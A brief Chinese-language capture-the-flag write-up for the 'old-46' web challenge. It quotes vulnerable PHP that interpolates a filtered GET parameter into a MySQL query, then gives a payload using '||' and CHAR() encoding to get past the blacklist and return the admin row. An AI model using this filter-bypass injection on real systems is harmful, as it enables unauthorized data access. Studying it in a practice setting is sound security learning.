# old-46_300

* 這一題一進去就可以看到斗大的標題 sql injection 
* 直接看一下 source code 
    ```php=
    if($_GET['lv']){
        $db = dbconnect();
        $_GET['lv'] = addslashes($_GET['lv']);
        $_GET['lv'] = str_replace(" ","",$_GET['lv']);
        $_GET['lv'] = str_replace("/","",$_GET['lv']);
        $_GET['lv'] = str_replace("*","",$_GET['lv']);
        $_GET['lv'] = str_replace("%","",$_GET['lv']);
        if(preg_match("/select|0x|limit|cash/i",$_GET['lv'])) exit();
        $result = mysqli_fetch_array(mysqli_query($db,"select id,cash from chall46 where lv=$_GET[lv]"));
        if($result){
          echo("{$result['id']} information<br><br>money : {$result['cash']}");
          if($result['id'] == "admin") solve(46);
        }
      }
    ```
* 可以看到過濾了一些東西。我們的目的是把 id 變成 admin
* 所以可以用 `or id = 'admin'` 的方式
* 不過當然會被過濾
* 所以在眾多不可能中，想到了這一個 payload `(0)||id=char(97,100,109,105,110)`
* 送出之後就過拉
